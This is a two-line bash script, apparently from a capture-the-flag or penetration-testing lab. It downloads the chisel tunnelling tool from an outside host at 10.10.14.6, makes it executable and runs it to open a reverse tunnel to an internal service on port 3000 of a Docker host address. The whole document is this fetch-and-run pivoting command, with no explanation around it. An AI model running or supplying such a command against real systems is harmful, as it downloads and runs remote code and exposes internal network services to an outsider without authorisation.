#!/bin/bash
wget http://10.10.14.6:9090/chisel && chmod +x chisel && ./chisel client 10.10.14.6:8000 R:3000:172.17.0.1:3000
